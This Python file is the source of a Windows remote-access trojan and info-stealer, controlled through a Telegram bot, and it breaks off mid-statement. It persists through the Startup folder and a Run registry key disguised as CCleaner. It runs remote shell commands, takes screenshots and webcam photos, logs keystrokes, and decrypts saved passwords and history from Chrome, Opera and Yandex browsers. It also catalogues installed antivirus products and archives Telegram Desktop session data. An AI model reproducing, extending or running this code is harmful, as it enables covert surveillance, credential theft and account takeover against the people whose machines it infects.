import os
import sqlite3
import win32crypt
import shutil
import requests
import zipfile
import getpass
import win32api
import platform
import time
import cv2
import sys
import json
import base64
import random
import sqlite3
import os
import telebot
import sys
import psutil
import GPUtil
import subprocess
import ffpass
import configparser
import telebot
import logging
import winreg
import multiprocessing
from PIL import ImageGrab
from os.path import basename
from base64 import encodebytes
from shutil import copyfile
from time import sleep
from datetime import datetime, timedelta
from tabulate import tabulate
from Crypto.Cipher import AES
from pynput.keyboard import Key, Listener
from environs import Env

env = Env()
env.read_env()

TOKEN = env.str("STEALBOT_TOKEN")
CHAT_ID = '622655681'

connection = False

while connection is False:
    try:
        bot = telebot.TeleBot(TOKEN)
        bot.send_message(int(CHAT_ID), f'\nSTART NEW SESSION\nPC: {getpass.getuser()}')
        connection = True
        time.sleep(2)
    except:
        pass

# --------------------AUTORUN-----------------------#
autorun_dir = f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
sec_autorun_dir = f'C:\\Users\\{getpass.getuser()}\\AppData\\Local'
file_adress = os.path.abspath(sys.argv[0])

try:

    shutil.copy(file_adress, autorun_dir, follow_symlinks=False)
    shutil.copy(file_adress, sec_autorun_dir, follow_symlinks=False)

    keyValue = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyValue, 0, winreg.KEY_ALL_ACCESS)

    winreg.SetValueEx(key, 'CCleaner', None, winreg.REG_SZ,
                      f'"{sec_autorun_dir}\\CCleaner.exe" --no-startup-window --atlogin-bgr-mark /prefetch:5')

    winreg.CloseKey(key)

    if connection is True:
        bot.send_message(int(CHAT_ID), 'ADD TO AUTORUN SUCCESSFUL')
    else:
        pass

except Exception as e:
    if connection is True:
        bot.send_message(int(CHAT_ID), f'AUTORUN ERROR(or file is added before): {e}')
    else:
        pass


# --------------------AUTORUN-----------------------#

# ----------------------------------------------------------------------------------------CONSOLE------------------------------------------------------------------------#
@bot.message_handler(commands=['cmd'])
def cmd(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:
            output = subprocess.getoutput(m.text[5:]).encode()
            bot.send_message(int(CHAT_ID), output)

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), f'CMD ERROR: {e}')
            except:
                pass
    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


# ----------------------------------------------------------------------------------------CONSOLE------------------------------------------------------------------------#

# ----------------------------------------------------------------------------------------SCREENSHOT---------------------------------------------------------------------#

@bot.message_handler(commands=['screen'])
def get_screenshot(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:
            screen = ImageGrab.grab()

            screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

            bot.send_photo(int(CHAT_ID),
                           open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg', 'rb'))
            os.remove(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\sreenshot.jpg')

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), f'SCREENSHOT ERROR: {e}')
            except:
                pass

    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


# ----------------------------------------------------------------------------------------SCREENSHOT---------------------------------------------------------------------#

# ----------------------------------------------------------------------------------------PROCESS-EXIT-------------------------------------------------------------------#

@bot.message_handler(commands=['exit'])
def cmd(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:

            bot.send_message(int(CHAT_ID), 'CLOSE')
            sys.exit()

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), 'EXIT ERROR: {e}')
            except:
                pass

    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


# ----------------------------------------------------------------------------------------PROCESS-EXIT-------------------------------------------------------------------#


# -----------------------------------------------------------------------------------------CAMERA-------------------------------------------------------------------------#

@bot.message_handler(commands=['cam'])
def get_webcam(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:
            cap = cv2.VideoCapture(0)

            for i in range(30):
                cap.read()

            ret, frame = cap.read()

            file_path = os.getenv('APPDATA') + '\\643h623j5k.png'

            cv2.imwrite(file_path, frame)

            bot.send_photo(int(CHAT_ID), open(file_path, 'rb'))

            cap.release()

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\643h623j5k.png')
            except:
                pass

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), f'WEBCAM ERROR: {e}')
            except:
                pass
    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


# ---------------------------------------------------------------------CAMERA------------------------------------------------------------------#


# ---------------------------------------------------------------KEY-LOGGER--------------------------------------------------------------------#


keylog_dir = f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\yelwpfw53.txt'


def log():
    logging.basicConfig(filename=keylog_dir, level=logging.DEBUG, format=" %(asctime)s - %(message)s")

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


log_task = multiprocessing.Process(target=log, args=())


@bot.message_handler(commands=['keylogon'])
def keylogon(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:
            try:
                fh = logging.FileHandler(keylog_dir, mode='w')
                fh.setLevel(logging.DEBUG)
            except:
                pass
            log_task.start()
            try:
                bot.send_message(int(CHAT_ID), 'KEYLOGGER ACTIVATED')
            except:
                pass

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), f'KEYLOGERROR: {e}')
            except:
                pass

    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


@bot.message_handler(commands=['keylogsend'])
def keylogsend(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:

            mes = bot.send_document(int(CHAT_ID), document=open(keylog_dir, 'r'), caption='KEYLOG')

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), f'KEYLOGERROR: {e}')
            except:
                pass

    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


@bot.message_handler(commands=['keylogoff'])
def keylogdel(m, res=False):
    if m.chat.id == int(CHAT_ID):
        try:

            log_task.terminate()

            mes = bot.send_document(int(CHAT_ID), document=open(keylog_dir, 'r'),
                                    caption='LOG SUCCESSFULY SENDED, GOING TO CLEAN...')

            fh = logging.FileHandler(keylog_dir, mode='w')
            fh.setLevel(logging.DEBUG)

            bot.edit_message_caption(chat_id=int(CHAT_ID), message_id=mes.id,
                                     caption='LOG SUCCESSFULY SENDED\nSUCCESSFUL CLEAN')

        except Exception as e:
            try:
                bot.send_message(int(CHAT_ID), f'KEYLOGERROR: {e}')
            except:
                pass

    else:
        try:
            bot.send_message(m.chat.id, 'access denied')
        except:
            pass


# ---------------------------------------------------------------KEY-LOGGER--------------------------------------------------------------------#


# -----------------------------------------------------GO----STEAL--------------------------------------------------------------------#

@bot.message_handler(commands=['steal'])
def get_stealed(m, res=False):
    if m.chat.id == int(CHAT_ID):

        try:
            ###############################################################################
            #                                CHROME                                       #
            ###############################################################################

            try:
                def get_chrome_datetime(chromedate):

                    if chromedate != 86400000000 and chromedate:
                        try:
                            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                        except Exception as e:
                            print(f"Error: {e}, chromedate: {chromedate}")
                            return chromedate
                    else:
                        return ""

                def get_encryption_key():
                    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                    "AppData", "Local", "Google", "Chrome",
                                                    "User Data", "Local State")
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)

                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

                    key = key[5:]

                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                def decrypt_data(data, key):
                    try:

                        iv = data[3:15]
                        data = data[15:]

                        cipher = AES.new(key, AES.MODE_GCM, iv)

                        return cipher.decrypt(data)[:-16].decode()
                    except:
                        try:
                            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                        except:

                            return ""
            except:
                print('Нету хрома')

            ################################################################################
            #                                 OPERA                                        #
            ################################################################################

            try:
                def get_opera_datetime(chromedate):

                    if chromedate != 86400000000 and chromedate:
                        try:
                            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                        except Exception as e:
                            print(f"Error: {e}, chromedate: {chromedate}")
                            return chromedate
                    else:
                        return ""

                def get_encryption_key_opera():
                    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                    "AppData", "Roaming", "Opera Software", "Opera Stable",
                                                    "Local State")
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)

                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

                    key = key[5:]

                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                def decrypt_data_opera(data, key):
                    try:

                        iv = data[3:15]
                        data = data[15:]

                        cipher = AES.new(key, AES.MODE_GCM, iv)

                        return cipher.decrypt(data)[:-16].decode()
                    except:
                        try:
                            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                        except:

                            return ""

            except:
                print('Нету Opera')

            try:
                def get_opera_datetime(chromedate):

                    if chromedate != 86400000000 and chromedate:
                        try:
                            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                        except Exception as e:
                            print(f"Error: {e}, chromedate: {chromedate}")
                            return chromedate
                    else:
                        return ""

                def get_encryption_key_opera():
                    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                    "AppData", "Roaming", "Opera Software", "Opera Stable",
                                                    "Local State")
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)

                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

                    key = key[5:]

                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                def decrypt_data_opera(data, key):
                    try:

                        iv = data[3:15]
                        data = data[15:]

                        cipher = AES.new(key, AES.MODE_GCM, iv)

                        return cipher.decrypt(data)[:-16].decode()
                    except:
                        try:
                            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                        except:

                            return ""
            except:
                print('Нету Opera')

            # ################################################################################
            # #                                 YANDEX                                       #
            try:
                def get_yandex_datetime(chromedate):
                    if chromedate != 86400000000 and chromedate:
                        try:
                            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                        except Exception as e:
                            print(f"Error: {e}, chromedate: {chromedate}")
                            return chromedate
                    else:
                        return ""

                def get_encryption_key_yandex():
                    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                    "AppData", "Local", "Yandex", "YandexBrowser", "User Data",
                                                    "Local State")
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)

                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

                    key = key[5:]

                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                def decrypt_data_yandex(data, key):
                    try:

                        iv = data[3:15]
                        data = data[15:]

                        cipher = AES.new(key, AES.MODE_GCM, iv)

                        return cipher.decrypt(data)[:-16].decode()
                    except:
                        try:
                            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                        except:

                            return ""
            except:
                print('Нету Yandex')

            def get_size(bytes, suffix="B"):
                factor = 1024
                for unit in ["", "K", "M", "G", "T", "P"]:
                    if bytes < factor:
                        return f"{bytes:.2f}{unit}{suffix}"
                    bytes /= factor

            ################################################################################
            #                              ДАННЫЕ О КОМПЬЮТЕРЕ                             #
            ################################################################################

            uname = platform.uname()

            namepc = "\nИмя пк: " + str(uname.node)
            countofcpu = psutil.cpu_count(logical=True)
            allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu)

            cpufreq = psutil.cpu_freq()
            cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'

            svmem = psutil.virtual_memory()
            allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
            ramfree = "\nДоступно: " + str(get_size(svmem.available))
            ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

            partitions = psutil.disk_partitions()
            for partition in partitions:
                nameofdevice = "\nДиск: " + str(partition.device)
                nameofdick = "\nИмя диска: " + str(partition.mountpoint)
                typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:

                    continue
                allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
                usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
                freestorage = "\nСвободно: " + str(get_size(partition_usage.free))

            try:
                gpus = GPUtil.getGPUs()
                list_gpus = []
                for gpu in gpus:
                    gpu_name = "\nМодель видеокарты: " + gpu.name

                    gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

                    gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

                    gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
            except:
                print('Нету видеокарты')
            ################################################################################
            #                              АНТИВИРУСЫ                                      #
            ################################################################################

            Antiviruses = {
                'C:\\Program Files\\Windows Defender': 'Windows Defender',
                'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
                'C:\\Program Files\\AVG\\Antivirus': 'AVG',
                'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
                'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
                'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
                'C:\\Program Files\\DrWeb': 'Dr.Web',
                'C:\\Program Files\\ESET\\ESET Security': 'ESET',
                'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
                'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
                'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
            }

            Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]

            ################################################################################
            #                              ФОТКАЕМ ЧЕРЕЗ ВЕБ-КАМЕРУ                        #
            ################################################################################

            try:

                cap = cv2.VideoCapture(0)

                for i in range(30):
                    cap.read()

                ret, frame = cap.read()

                cv2.imwrite(os.getenv("APPDATA") + '\\4543t353454.png', frame)

                cap.release()
            except:
                print('')

            Antiviruses = json.dumps(Antivirus)
            ###############################################################################
            #                             ВОРУЕМ ПАРОЛИ CHROME                            #
            ###############################################################################
            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                              "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key

                def decrypt_payload(cipher, payload):
                    return cipher.decrypt(payload)

                def generate_cipher(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)

                def decrypt_password(buff, master_key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = generate_cipher(master_key, iv)
                        decrypted_pass = decrypt_payload(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()
                        return decrypted_pass
                    except Exception as e:

                        return "Chrome < 80"
            except:
                print('НЕту хрома')

            if __name__ == '__main__':
                try:
                    master_key = get_master_key()
                    login_db = os.environ[
                                   'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                    shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
                    conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
                    cursor = conn.cursor()

                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)

                        alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                        with open(os.getenv("APPDATA") + '\\chromepasswords.txt', "a") as o:
                            o.write(alldatapass)
                    try:

                        os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
                    except Exception as e:
                        pass
                except:
                    print('Нету Chrome')

            ################################################################################
            #                              ВОРУЕМ ИСТОРИЮ CHROME                           #
            ################################################################################

            def parse(url):
                try:
                    parsed_url_components = url.split('//')
                    sublevel_split = parsed_url_components[1].split('/', 1)
                    domain = sublevel_split[0].replace("www.", "")
                    return domain
                except IndexError:
                    print("URL format error!")

            def analyze(results):

                prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

                if prompt == "c":
                    for site, count in sites_count_sorted.items():
                        print(site, count)
                elif prompt == "p":
                    plt.bar(range(len(results)), results.values(), align='edge')
                    plt.xticks(rotation=45)
                    plt.xticks(range(len(results)), results.keys())
                    plt.show()
                else:
                    print("[.] Uh?")
                    quit()

            try:
                data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
                files = os.listdir(data_path)

                history_db = os.path.join(data_path, 'history')

                shutil.copy2(history_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
                c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
                cursor = c.cursor()
                select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
                cursor.execute(select_statement)

                r = cursor.fetchall()
                datas = '\n'.join([str(item) for item in r])
                file = open(os.getenv("APPDATA") + '\\history.txt', "w+")
                file.write(datas)
            except:
                print('Нету Chrome')

            def parse(url):
                try:
                    parsed_url_components = url.split('//')
                    sublevel_split = parsed_url_components[1].split('/', 1)
                    domain = sublevel_split[0].replace("www.", "")
                    return domain
                except IndexError:
                    print("URL format error!")

            def analyze(results):

                prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

                if prompt == "c":
                    for site, count in sites_count_sorted.items():
                        print(site, count)
                elif prompt == "p":
                    plt.bar(range(len(results)), results.values(), align='edge')
                    plt.xticks(rotation=45)
                    plt.xticks(range(len(results)), results.keys())
                    plt.show()
                else:
                    print("[.] Uh?")
                    quit()

            try:
                data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
                files = os.listdir(data_path)

                history_db = os.path.join(data_path, 'history')

                shutil.copy2(history_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
                c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
                cursor = c.cursor()
                select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
                cursor.execute(select_statement)

                r = cursor.fetchall()
                datas = '\n'.join([str(item) for item in r])
                file = open(os.getenv("APPDATA") + '\\history.txt', "w+")
                file.write(datas)
            except:
                print('Нету Chrome')

            ################################################################################
            #                                 OPERA                                        #
            ################################################################################
            try:
                def get_master_key_opera():
                    with open(os.environ[
                                  'USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State',
                              "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key

                def decrypt_payload_opera(cipher, payload):
                    return cipher.decrypt(payload)

                def generate_cipher_opera(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)

                def decrypt_password_opera(buff, master_key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = generate_cipher_opera(master_key, iv)
                        decrypted_pass = decrypt_payload_opera(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()
                        return decrypted_pass
                    except Exception as e:

                        return "Opera < 80"
            except:
                print('НЕту opera')

            if __name__ == '__main__':
                try:
                    master_key = get_master_key_opera()
                    login_db = os.environ[
                                   'USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera Stable\Login Data'
                    shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    cursor = conn.cursor()

                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password_opera(encrypted_password, master_key)

                        alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                        with open(os.getenv("APPDATA") + '\\operapasswords.txt', "a") as o:
                            o.write(alldatapass)
                    try:
                        os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    except Exception as e:
                        pass
                except:
                    print('Нету Opera')

            try:
                def get_master_key_opera():
                    with open(os.environ[
                                  'USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
                              "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key

                def decrypt_payload_opera(cipher, payload):
                    return cipher.decrypt(payload)

                def generate_cipher_opera(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)

                def decrypt_password_opera(buff, master_key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = generate_cipher_opera(master_key, iv)
                        decrypted_pass = decrypt_payload_opera(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()
                        return decrypted_pass
                    except Exception as e:

                        return "Opera < 80"
            except:
                print('НЕту opera')

            if __name__ == '__main__':
                try:
                    master_key = get_master_key_opera()
                    login_db = os.environ[
                                   'USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera GX Stable\Login Data'
                    shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    cursor = conn.cursor()

                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password_opera(encrypted_password, master_key)

                        alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                        with open(os.getenv("APPDATA") + '\\operapasswords.txt', "a") as o:
                            o.write(alldatapass)
                    try:
                        os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    except Exception as e:
                        pass
                except:
                    print('Нету Opera')

            ################################################################################
            #                                 OPERA                                        #
            ################################################################################
            try:
                def parse_opera(url):
                    try:
                        parsed_url_components = url.split('//')
                        sublevel_split = parsed_url_components[1].split('/', 1)
                        domain = sublevel_split[0].replace("www.", "")
                        return domain
                    except IndexError:
                        print("URL format error!")

                def analyze_opera(results):

                    prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

                    if prompt == "c":
                        for site, count in sites_count_sorted.items():
                            print(site, count)
                    elif prompt == "p":
                        plt.bar(range(len(results)), results.values(), align='edge')
                        plt.xticks(rotation=45)
                        plt.xticks(range(len(results)), results.keys())
                        plt.show()
                    else:
                        print("[.] Uh?")
                        quit()

                def pass_opera():
                    try:
                        data_path_opera = os.path.expanduser('~') + r"\AppData\Roaming\Opera Software\Opera Stable"
                        files = os.listdir(data_path_opera)

                        history_db_opera = os.path.join(data_path_opera, 'History')

                        shutil.copy2(history_db_opera,
                                     'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
                        c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
                        cursor = c.cursor()
                        select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
                        cursor.execute(select_statement)

                        r = cursor.fetchall()
                        datas = '\n'.join([str(item) for item in r])
                        file = open(os.getenv("APPDATA") + '\\historyOPERA.txt', "w+")
                        file.write(datas)
                    except:
                        print('Нету Opera')
            except:
                pass

            pass_opera()

            try:
                def parse_opera(url):
                    try:
                        parsed_url_components = url.split('//')
                        sublevel_split = parsed_url_components[1].split('/', 1)
                        domain = sublevel_split[0].replace("www.", "")
                        return domain
                    except IndexError:
                        print("URL format error!")

                def analyze_opera(results):

                    prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

                    if prompt == "c":
                        for site, count in sites_count_sorted.items():
                            print(site, count)
                    elif prompt == "p":
                        plt.bar(range(len(results)), results.values(), align='edge')
                        plt.xticks(rotation=45)
                        plt.xticks(range(len(results)), results.keys())
                        plt.show()
                    else:
                        print("[.] Uh?")
                        quit()

                def pass_opera2():
                    try:
                        data_path_opera = os.path.expanduser('~') + r"\AppData\Roaming\Opera Software\Opera Stable"
                        files = os.listdir(data_path_opera)

                        history_db_opera = os.path.join(data_path_opera, 'History')

                        shutil.copy2(history_db_opera,
                                     'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
                        c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
                        cursor = c.cursor()
                        select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
                        cursor.execute(select_statement)

                        r = cursor.fetchall()
                        datas = '\n'.join([str(item) for item in r])
                        file = open(os.getenv("APPDATA") + '\\historyOPERA.txt', "w+")
                        file.write(datas)
                    except:
                        print('Нету Opera')
            except:
                pass

            pass_opera2()
            ################################################################################
            #                                 YANDEX                                       #
            ################################################################################

            try:
                def get_master_key_yandex():
                    with open(os.environ[
                                  'USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
                              "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key

                def decrypt_payload_yandex(cipher, payload):
                    return cipher.decrypt(payload)

                def generate_cipher_yandex(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)

                def decrypt_password_yandex(buff, master_key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = generate_cipher_yandex(master_key, iv)
                        decrypted_pass = decrypt_payload_yandex(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()
                        return decrypted_pass
                    except Exception as e:

                        return "Yandex < 80"
            except:
                pass

            if __name__ == '__main__':

                try:
                    master_key = get_master_key_yandex()
                    login_db = os.environ[
                                   'USERPROFILE'] + os.sep + r'AppData\Local\\Yandex\YandexBrowser\User Data\Default\Login Data'
                    shutil.copy2(login_db,
                                 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
                    conn = sqlite3.connect(
                        'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
                    cursor = conn.cursor()

                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password_yandex(encrypted_password, master_key)

                        alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                        with open(os.getenv("APPDATA") + '\\operapasswords.txt', "a") as o:
                            o.write(alldatapass)
                    try:
                        os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
                    except Exception as e:
                        pass
                except:
                    print('')

            def parse_yandex(url):
                try:
                    parsed_url_components = url.split('//')
                    sublevel_split = parsed_url_components[1].split('/', 1)
                    domain = sublevel_split[0].replace("www.", "")
                    return domain
                except IndexError:
                    print("URL format error!")

            def analyze_yandex(results):

                prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

                if prompt == "c":
                    for site, count in sites_count_sorted.items():
                        print(site, count)
                elif prompt == "p":
                    plt.bar(range(len(results)), results.values(), align='edge')
                    plt.xticks(rotation=45)
                    plt.xticks(range(len(results)), results.keys())
                    plt.show()
                else:
                    print("[.] Uh?")
                    quit()

            def pass_yandex():
                try:
                    data_path_opera = os.path.expanduser(
                        '~') + r'\AppData\Local\\Yandex\YandexBrowser\User Data\Default'
                    files = os.listdir(data_path_opera)

                    history_db_yandex = os.path.join(data_path_opera, 'History')

                    shutil.copy2(history_db_yandex,
                                 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyyandex.db')
                    c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyyandex.db')
                    cursor = c.cursor()
                    select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
                    cursor.execute(select_statement)

                    r = cursor.fetchall()
                    datas = '\n'.join([str(item) for item in r])
                    file = open(os.getenv("APPDATA") + '\\historyYANDEX.txt', "w+")
                    file.write(datas)
                except:
                    print('Нету Opera')

            pass_yandex()

            ################################################################################
            #                              Логи Telegram                                   #
            ################################################################################

            try:
                tg_directory1 = "D:\\Telegram Desktop\\tdata\\"
                doc1 = shutil.make_archive('tg1', 'zip', tg_directory1)  # Делаем архив
            except:
                pass
            try:
